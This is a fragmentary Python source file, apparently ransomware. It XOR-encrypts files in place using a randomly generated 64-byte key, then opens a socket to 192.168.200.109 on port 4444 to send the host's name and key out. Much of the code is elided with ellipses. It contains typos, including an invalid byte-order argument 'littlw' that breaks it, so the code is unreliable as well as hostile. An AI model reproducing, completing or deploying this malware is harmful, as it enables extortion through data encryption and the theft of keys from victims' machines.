        ...
        try:
            ...
            for byte in data:
                ...
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'littlw'))
                # increment key index
            ...
            print('Failed to encrypt fiel :(')
        q.task_done()


# socket information
IP_ADDRES = '192.168.200.109'
PORT = 4444

#Encryption information
ENCRYOTION_LEVEL = 512 // 8       # 512 bit encryption == 64 bytes
key_char_pool = 'abcdefghilmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>,./;[]{}\|'
...
key = ''
for i in range(ENCRYOTION_LEVEL):
...
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    ...
    print('Successfully connected... tranmitting hostname and key')
